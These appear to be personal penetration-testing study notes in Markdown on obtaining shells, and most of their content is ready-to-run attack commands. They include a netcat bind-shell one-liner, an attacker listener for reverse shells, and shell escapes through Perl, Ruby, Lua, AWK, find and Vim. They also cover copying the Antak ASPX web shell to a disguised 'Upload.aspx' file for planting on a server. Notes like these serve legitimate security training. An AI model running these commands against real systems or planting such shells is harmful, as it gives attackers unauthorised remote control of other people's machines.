https://www.revshells.com/
# #Bind Shell
![[BindShell.png]]
Target system has a listener and awaits a connection from the attacker.
### Bind Shell with NC 
```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 1234 > /tmp/f
```
```shell
nc -nv <ip> <port>
```

# #Reverse Shell
Attacker 
```shell
sudo nc -lvnp 443
```
# Interactive Shells
```shell
/bin/sh -i
```
### Perl
```shell
perl —e 'exec "/bin/sh";'
```
Run from script:
```shell
perl: exec "/bin/sh";
```
### Ruby 
```shell
ruby: exec "/bin/sh"
```
### Lua
```shell
lua: os.execute('/bin/sh')
```
### AWK
```shell
awk 'BEGIN {system("/bin/sh")}'
```
### Find
```shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

```shell
find . -exec /bin/sh \; -quit
```
### Vim
```shell
vim -c ':!/bin/sh'
```

```vim
vim
:set shell=/bin/sh
:shell
```

# Web Shells
#### [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
	Ready made files that can be injected 
#### Antak
###### ASPX = Active Server Page Extended (ASPX) 
Built on ASP.NET framework.
Web form pages generated for users to input dat
##### Antak web shell
Web shell built in ASP.NET that gives powershell commands


```shell
ls /usr/share/nishang/Antak-WebShell
```

```shell
 cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```
Change username and password?

#### PHP
